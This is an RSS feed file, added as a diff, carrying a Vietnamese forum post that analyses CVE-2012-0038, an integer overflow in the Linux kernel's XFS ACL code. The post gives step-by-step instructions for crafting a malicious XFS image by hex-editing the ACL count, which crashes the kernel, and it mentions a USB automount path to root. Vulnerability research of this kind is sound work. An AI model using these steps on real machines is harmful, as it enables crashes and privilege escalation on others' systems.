@@ -1,0 +1,153 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "CVE-2012-0038: XFS ACL count integer overflow PoC"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "CVE-2012-0038: XFS ACL count integer overflow PoC"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>CVE-2012-0038: XFS ACL count integer overflow PoC</title>
+				<description><![CDATA[ Một lỗi bảo mật khá cơ bản được tìm ra trong mã nguồn của Linux kernel trong việc thao tác XFS file system.
+
+Trong linux/fs/xfs/xfs_acl.c :
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>STATIC struct posix_acl *
+xfs_acl_from_disk&#40;struct xfs_acl *aclp&#41;
+{
+struct posix_acl_entry *acl_e;
+struct posix_acl *acl;
+struct xfs_acl_entry *ace;
+int count, i;
+
+count = be32_to_cpu&#40;aclp-&gt;acl_cnt&#41;;
+
+acl = posix_acl_alloc&#40;count, GFP_KERNEL&#41;;
+if &#40;!acl&#41;
+return ERR_PTR&#40;-ENOMEM&#41;;
+
+for &#40;i = 0; i &lt; count; i++&#41; {
+acl_e = &amp;acl-&gt;a_entries&#91;i&#93;;
+ace = &amp;aclp-&gt;acl_entry&#91;i&#93;;
+...
+acl_e-&gt;e_tag = be32_to_cpu&#40;ace-&gt;ae_tag&#41;;
+acl_e-&gt;e_perm = be16_to_cpu&#40;ace-&gt;ae_perm&#41;;
+...
+}
+return acl;
+...
+}</pre>
+		</div>
+
+Trong posix_acl_alloc chúng ta có:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>struct posix_acl *
+posix_acl_alloc&#40;int count, gfp_t flags&#41;
+{
+const size_t size = sizeof&#40;struct posix_acl&#41; +
+count * sizeof&#40;struct posix_acl_entry&#41;;
+struct posix_acl *acl = kmalloc&#40;size, flags&#41;;
+if &#40;acl&#41;
+posix_acl_init&#40;acl, count&#41;;
+return acl;
+}</pre>
+		</div>
+
+Như vậy biến count được khai báo là kiểu Interger. Biến size được tính toán dựa trên :
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>const size_t size = sizeof&#40;struct posix_acl&#41; +
+count * sizeof&#40;struct posix_acl_entry&#41;;</pre>
+		</div>
+
+Vấn đề xảy ra khi count quá lớn, dẫn tới phép toán này gây ra tràn số, size sẽ &lt; count. Lúc này bộ nhớ được cấp phát sẽ nhỏ hơn thực tế mà chương trình sử dụng ở:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>for &#40;i = 0; i &lt; count; i++&#41; {
+......</pre>
+		</div>
+
+Tử đây một lỗi tràn bộ đệm sẽ xảy ra. Kết quả là kernel panic hoặc có thể dẫn tới thực thi mã ( code execution ) ở mức kernel.
+Nếu hệ thống có hỗ trợ automount XFS file system, khi chúng ta chuẩn bị một đĩa USB với định dạng XFS với các thông số và mã khai thác phù hợp sẽ dẫn tới lấy quyền root ( vì module này chạy với quyền của kernel)  hoặc ít nhất có thể làm crash hệ thống đó.
+Mình thấy bug này khá thú vị và nhân tiện cũng muốn hướng dẫn các bạn cách viết exploit cho kernel driver ( nhưng cái như local root mà các bạn hay xài).
+Trước tiên chúng ta tạo ra 1 xfs file system chuẩn:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91;root@vulnBox xfs&#93;# dd if=/dev/zero of=expl bs=1M count=40
+40+0 records in
+40+0 records out
+41943040 bytes &#40;42 MB&#41; copied, 0.0600407 s, 699 MB/s
+&#91;root@vulnBox xfs&#93;# mkfs.xfs expl
+meta-data=expl                   isize=256    agcount=2, agsize=5120 blks
+=                       sectsz=512   attr=2, projid32bit=0
+data     =                       bsize=4096   blocks=10240, imaxpct=25
+=                       sunit=0      swidth=0 blks
+naming   =version 2              bsize=4096   ascii-ci=0
+log      =internal log           bsize=4096   blocks=1200, version=2
+=                       sectsz=512   sunit=0 blks, lazy-count=1
+realtime =none                   extsz=4096   blocks=0, rtextents=0
+&#91;root@vulnBox xfs&#93;#</pre>
+		</div>
+
+Tiếp theo, mount nó ra và tạo 1 file rồi thay đổi ACL cho nó( vì phần bị lỗi ở xfs_acl): 
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91;root@vulnBox xfs&#93;# mount expl /mnt/tm/
+&#91;root@vulnBox xfs&#93;# echo &quot;coolExploit&quot; &gt; /mnt/tm/hellosuto
+&#91;root@vulnBox xfs&#93;# setfacl -m u:user:rw- /mnt/tm/hellosuto
+&#91;root@vulnBox xfs&#93;# getfattr -e hex -dm '.*' /mnt/tm/hellosuto
+getfattr: Removing leading '/' from absolute path names
+# file: mnt/tm/hellosuto
+security.selinux=0x756e636f6e66696e65645f753a6f626a6563745f723a66696c655f743a733000
+system.posix_acl_access=0x0200000001000600ffffffff02000600e803000004000400ffffffff10000600ffffffff20000400ffffffff
+trusted.SGI_ACL_FILE=0x0000000500000001ffffffff0006000000000002000003e80006000000000004ffffffff0004000000000010ffffffff0006000000000020ffffffff00040000
+
+&#91;root@vulnBox xfs&#93;# getfacl  /mnt/tm/hellosuto
+getfacl: Removing leading '/' from absolute path names
+# file: mnt/tm/hellosuto
+# owner: root
+# group: root
+user::rw-
+user:user:rw-
+group::r--
+mask::rw-
+other::r--</pre>
+		</div>
+
+Mở ra bằng 1 hex editor và thay đổi:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>0000DF60   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................................
+0000DF80   00 00 00 00  00 40 0C 53  47 49 5F 41  43 4C 5F 46  49 4C 45 00  00 00 05 00  00 00 01 FF  FF FF FF 00  .....@.SGI_ACL_FILE.............</pre>
+		</div>
+
+Từ :
+<b>49 4C 45 00  00 00 05</b>
+<b>49 4C 45 40  00 00 00</b>
+để chuyển số lượng ACL entry từ 5 sang 0×40000000.
+Và :
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91; 4107.439000&#93; BUG: unable to handle kernel paging request at ffffffff
+&#91; 4107.439015&#93; IP: &#91;&lt;c04df18e&gt;&#93; __kmalloc+0x9d/0xff
+&#91; 4107.439023&#93; *pde = 00ffc067 *pte = 00000000
+&#91; 4107.439023&#93; Oops: 0000 &#91;#1&#93; SMP
+&#91; 4107.439023&#93; Modules linked in: xfs fcoe libfcoe 8021q garp stp llc lockd libfc scsi_transport_fc scsi_tgt ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 nf_conntrack_ipv4 nf_defrag_ipv4 ip6table_filter xt_state ip6_tables nf_conntrack ppdev snd_intel8x0 snd_ac97_codec ac97_bus snd_seq snd_seq_device parport_pc snd_pcm snd_timer snd soundcore joydev i2c_piix4 microcode i2c_core parport e1000 snd_page_alloc sunrpc uinput &#91;last unloaded: scsi_wait_scan&#93;</pre>
+		</div>
+
+Như vậy chúng ta đã có sample để trigger bug này, phần tiếp theo các bạn có thể theo dõi ở :<span class="link"> http://bkitsec.vn</span> .]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/41517.hva#257306</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/41517.hva#257306</link>
+				<pubDate><![CDATA[Thu, 8 Mar 2012 04:21:01]]> GMT</pubDate>
+				<author><![CDATA[ cr4zyb0y]]></author>
+			</item>
+	</channel>
+</rss>
